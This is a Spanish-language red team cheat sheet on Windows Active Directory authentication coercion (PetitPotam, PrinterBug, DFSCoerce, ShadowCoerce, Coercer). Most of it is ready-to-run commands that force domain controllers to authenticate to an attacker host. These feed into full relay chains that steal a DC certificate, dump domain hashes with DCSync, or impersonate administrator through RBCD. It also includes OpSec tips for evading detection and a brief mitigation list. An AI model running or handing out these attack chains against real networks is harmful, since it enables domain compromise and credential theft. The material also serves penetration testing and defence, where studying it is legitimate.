---
aliases:
  - Coercion Techniques
  - NTLM Coercion
  - PetitPotam
  - PrinterBug
  - DFSCoerce
  - ShadowCoerce
  - SpoolSample
tags:
  - type/technique
  - technique/credential-access
  - technique/lateral-movement
  - env/windows
  - asset/active-directory
  - cred/ntlm
primary categories:
  - "[[Red Team]]"
secondary categories:
  - "[[Explotación]]"
tertiary categories:
  - "[[Active Directory]]"
type: Atomic
linked:
  - "[[Active Directory Explotación 1]]"
  - "[[NTLM Relay]]"
  - "[[Responder]]"
  - "[[Impacket Toolkit]]"
---
# Authentication Coercion

***

## Cheatsheet
^auth-coercion

| Técnica | RPC Interface | Tool | CVE | Patched (parcial) |
| --- | --- | --- | --- | --- |
| **PetitPotam** | MS-EFSRPC (EfsRpcOpenFileRaw) | `PetitPotam.py` | CVE-2021-36942 | KB5005413 (parcial) |
| **PrinterBug / SpoolSample** | MS-RPRN (RpcRemoteFindFirstPrinterChangeNotification) | `printerbug.py`, `SpoolSample.exe` | MS10-061 (bug de design, no CVE) | Deshabilitar Print Spooler |
| **DFSCoerce** | MS-DFSNM (NetrDfsRemoveStdRoot) | `dfscoerce.py` | N/A | No patched (feature) |
| **ShadowCoerce** | MS-FSRVP (IsPathSupported) | `shadowcoerce.py` | CVE-2022-30154 | KB5015875 |
| **WSP Coerce** | MS-WSP (Windows Search Protocol) | `coercer` | N/A | N/A |
| **Coercer** (meta-tool) | Todos los anteriores | `coercer coerce` | | |

***

## Concepto

Funciones RPC "inocentes" que aceptan una ruta UNC como parámetro fuerzan al target a hacer auth SMB (NTLM) contra el path → atacante captura/relayea ese NTLM.

**Trigger**: RPC call desde atacante (unauth o low-priv) → target intenta acceder a `\\attacker\share` → envía NTLM del computer account del target.

**Resultado**: NetNTLMv2 de `TARGET$` → relay vía `ntlmrelayx` ([[Impacket Toolkit]]) a LDAPS/ADCS/SMB.

## Requisitos

- Conectividad al RPC interface del target (SMB 445, RPC endpoint mapper 135).
- Credenciales dependen de la técnica:
  - PetitPotam pre-parche: **unauth** (null session).
  - PetitPotam post-parche: user autenticado cualquier.
  - PrinterBug: user autenticado.
  - DFSCoerce: user autenticado.
  - ShadowCoerce: user autenticado (pre-parche).

## 1. PetitPotam (MS-EFSRPC)

Pre-parche (Server 2008-2019 sin KB5005413) → **unauth**. Post-parche → con creds.

### Unauth (pre-parche)
```bash
PetitPotam.py -u '' -p '' -d '' ATTACKER_IP DC_IP
# o via pipe explícito
PetitPotam.py -pipe lsarpc -u '' -p '' ATTACKER DC
```

### Con credenciales
```bash
PetitPotam.py -u user -p pass -d dom.local ATTACKER DC
```

### Impacket (equivalente)
```bash
impacket-PetitPotam ATTACKER TARGET_FQDN
```

### Pipes alternativos (bypass de parches parciales)
```
efsrpc, lsarpc, samr, netlogon, lsass
```

Tool automatiza probar cada pipe hasta encontrar uno vulnerable.

## 2. PrinterBug / SpoolSample (MS-RPRN)

Requiere Print Spooler corriendo en target (default en pre-2019 servers, incluye DCs).

### Linux
```bash
printerbug.py -hashes :NTHASH dom.local/user@DC ATTACKER

# Con pass
python3 dementor.py -u user -p pass -d dom.local ATTACKER DC
```

### Windows
```powershell
.\SpoolSample.exe DC ATTACKER
```

### Check si spooler corriendo
```bash
rpcdump.py @DC | grep -i spoolss
# Si aparece MS-RPRN → vulnerable
```

## 3. DFSCoerce (MS-DFSNM)

Sin parche disponible oficialmente — Microsoft considera feature. Requiere user autenticado low-priv.

```bash
dfscoerce.py -u user -p pass -d dom.local ATTACKER DC
```

## 4. ShadowCoerce (MS-FSRVP)

Post-parche KB5015875 mitigado. Pre-parche con user autenticado.

```bash
shadowcoerce.py -u user -p pass -d dom.local ATTACKER DC
```

## 5. Coercer (meta-tool)

Automatiza descubrimiento + trigger de todas las técnicas conocidas.

```bash
# Instalar
pip install coercer

# Scan (detecta técnicas vulnerables sin triggear)
coercer scan -u user -p pass -d dom.local -t DC

# Coerce (intenta todas hasta que una funcione)
coercer coerce -u user -p pass -d dom.local -t DC -l ATTACKER_IP

# Unauth
coercer coerce -u '' -p '' -t DC -l ATTACKER_IP

# Método específico
coercer coerce -u user -p pass -t DC -l ATTACKER --filter-method-name PetitPotam
```

## 6. Chains típicas

### a) Coerce DC → Relay → ADCS Web Enroll → Cert DC → DCSync

```bash
# Terminal 1: relay
sudo ntlmrelayx.py -t http://CA/certsrv/certfnsh.asp --adcs --template DomainController -smb2support

# Terminal 2: coerce
coercer coerce -u '' -p '' -t DC -l ATTACKER
# o
PetitPotam.py -u '' -p '' ATTACKER DC

# Post-relay: dc.pfx generado
certipy auth -pfx dc.pfx -dc-ip DC
# → NT hash de DC$

# DCSync
impacket-secretsdump -hashes :DC_HASH dom.local/'DC$'@DC -just-dc
```

### b) Coerce + Relay → LDAPS → Shadow Credentials

```bash
# Relay
sudo ntlmrelayx.py -t ldaps://DC --shadow-credentials --shadow-target 'VICTIM$'

# Coerce VICTIM
coercer coerce -u user -p pass -t VICTIM -l ATTACKER

# Auth con cert
certipy auth -pfx victim.pfx -dc-ip DC
```

### c) Coerce + Relay → LDAPS → RBCD

```bash
# Crear computer propio primero
impacket-addcomputer dom.local/user:pass -computer-name 'ATK$' -computer-pass 'P@ss123' -dc-host DC

# Relay
sudo ntlmrelayx.py -t ldaps://DC --delegate-access --escalate-user 'ATK$'

# Coerce target
coercer coerce -u user -p pass -t TARGET -l ATTACKER

# RBCD abuse
impacket-getST -spn cifs/TARGET.dom.local -impersonate administrator -dc-ip DC 'dom.local/ATK$:P@ss123'
```

## 7. Targets posibles

| Target | Impacto |
| --- | --- |
| **DC** | NetNTLMv2 de DC$ → relay ADCS → DA |
| **Exchange server** | Hash de Exchange$ (con writeDacl pre-CU14) → DA |
| **File server con LAPS-stored** | Hash del computer + RBCD → local admin |
| **Workstation** | Hash del user loggeado (via WPAD/mitm6 típicamente) |

## 8. Sin parche aplicable

```bash
# Identificar targets vulnerables
for host in $(cat dcs.txt); do
  coercer scan -u user -p pass -d dom.local -t $host
done
```

## 9. OpSec

- Coercion via lsarpc / samr / netlogon deja eventos diferentes (elegir pipe silencioso).
- Null session coercion (PetitPotam unauth) más ruidosa que autenticada.
- Evitar loop de auth (target sin ruta de regreso al atacante congela RPC).
- `responder -wFb` (disable SMB/HTTP servers) para no capturar accidental.

## 10. Mitigaciones (blue)

- Parches: KB5005413 (PetitPotam), KB5015875 (ShadowCoerce).
- Deshabilitar **Print Spooler** en todos los hosts que no imprimen (esp. DCs).
- **SMB signing required**.
- **LDAP signing + channel binding**.
- **EPA** en endpoints HTTP (ADCS, WSUS, OWA).
- **RPC filters** para bloquear interfaces EFSRPC/DFSNM desde non-admin.
- **Protected Users** para DA.

## Recursos

- [Coercer GitHub](https://github.com/p0dalirius/Coercer)
- [HackTricks - Printers Spooler Service](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/printers-spooler-service-abuse)
- [Microsoft KB5005413 (PetitPotam)](https://support.microsoft.com/en-us/topic/kb5005413-mitigating-ntlm-relay-attacks-on-active-directory-certificate-services-ad-cs-3612b773-4043-4aa9-b23d-b87afb77f758)

***
